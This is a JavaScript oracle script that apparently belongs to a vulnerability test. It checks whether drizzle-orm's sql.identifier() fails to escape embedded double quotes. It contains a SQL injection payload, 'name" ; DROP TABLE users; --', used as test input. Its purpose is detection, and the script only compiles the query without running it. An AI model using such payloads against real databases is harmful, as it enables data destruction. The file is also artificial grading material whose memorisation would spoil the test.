'use strict';

function main() {
  const result = { operation_completed: false, exploit_succeeded: false, evidence: '' };

  let core, pgCore;
  try {
    core = require('drizzle-orm');
    pgCore = require('drizzle-orm/pg-core');
  } catch (e) {
    console.log('ORACLE_RESULT ' + JSON.stringify(result));
    return;
  }

  const { sql } = core;
  const { pgTable, text, integer, PgDialect } = pgCore;

  let dialect;
  try {
    dialect = new PgDialect();
  } catch (e) {
    console.log('ORACLE_RESULT ' + JSON.stringify(result));
    return;
  }

  let usersTable;
  try {
    usersTable = pgTable('users', {
      id: integer('id').primaryKey(),
      name: text('name'),
      secret: text('secret')
    });
  } catch (e) {
    console.log('ORACLE_RESULT ' + JSON.stringify(result));
    return;
  }

  // Benign operation: a normal, safe identifier through sql.identifier()
  // to prove the identifier-building / compile path works as expected.
  let benignOk = false;
  try {
    const benignQuery = sql`SELECT ${sql.identifier('name')} FROM ${usersTable} WHERE ${usersTable.id} = 1`;
    const built = dialect.sqlToQuery(benignQuery);
    if (built && typeof built.sql === 'string' && built.sql.includes('"name"') && built.sql.includes('"users"')) {
      benignOk = true;
    }
  } catch (e) {
    console.log('ORACLE_RESULT ' + JSON.stringify(result));
    return;
  }

  if (!benignOk) {
    console.log('ORACLE_RESULT ' + JSON.stringify(result));
    return;
  }

  result.operation_completed = true;

  // Malicious input: an identifier string containing an embedded double
  // quote, simulating an attacker-controlled table/column name passed to
  // sql.identifier(). A correctly-escaping implementation must double any
  // embedded `"` characters when producing the final quoted identifier
  // (standard SQL identifier escaping), so the resulting compiled text
  // would contain `""` at the point of the embedded quote. The vulnerable
  // version fails to double the quote, which lets the embedded `"` close
  // the identifier early, allowing anything following it (e.g. a SQL
  // comment / statement terminator) to escape the quoted context.
  const maliciousIdent = 'name" ; DROP TABLE users; --';

  let exploitSucceeded = false;
  let evidence = '';
  try {
    const maliciousQuery = sql`SELECT ${sql.identifier(maliciousIdent)} FROM ${usersTable} WHERE ${usersTable.id} = 1`;
    const built = dialect.sqlToQuery(maliciousQuery);
    const compiled = (built && typeof built.sql === 'string') ? built.sql : '';

    // The raw identifier text begins with: name" ; DROP TABLE users; --
    // Safe escaping turns the single embedded quote into a doubled quote:
    //   "name"" ; DROP TABLE users; --"
    // Vulnerable (unescaped) output leaves a single quote there:
    //   "name" ; DROP TABLE users; --"
    // We detect exploitation by checking for the UNDOUBLED quote followed
    // directly by the injected SQL fragment (a single `"` not part of a
    // `""` pair right before ` ; DROP TABLE`).
    const injectedTail = ' ; DROP TABLE users; --';
    const unsafePattern = '"' + injectedTail; // single quote then injected SQL
    const safePattern = '""' + injectedTail; // doubled quote (escaped) then injected SQL

    if (compiled.includes(safePattern)) {
      exploitSucceeded = false;
      evidence = 'Embedded quote in identifier was safely escaped (doubled); compiled SQL: ' + compiled.slice(0, 200);
    } else if (compiled.includes(unsafePattern)) {
      exploitSucceeded = true;
      evidence = 'Embedded quote in identifier was NOT escaped, breaking out of quoting; compiled SQL: ' + compiled.slice(0, 200);
    } else if (compiled.includes(injectedTail)) {
      // Ambiguous: fragment present but neither exact pattern matched.
      // Treat presence without any doubled quote nearby as exploited.
      exploitSucceeded = !compiled.includes(safePattern);
      evidence = 'Injected fragment present with ambiguous quoting; compiled SQL: ' + compiled.slice(0, 200);
    } else {
      exploitSucceeded = false;
      evidence = 'Malicious identifier did not yield injected fragment in compiled SQL; compiled SQL: ' + compiled.slice(0, 200);
    }
  } catch (e) {
    exploitSucceeded = false;
    evidence = 'Malicious identifier was rejected/blocked (exception): ' + (e && e.message ? e.message : String(e));
  }

  result.exploit_succeeded = exploitSucceeded;
  result.evidence = evidence;

  console.log('ORACLE_RESULT ' + JSON.stringify(result));
}

main();
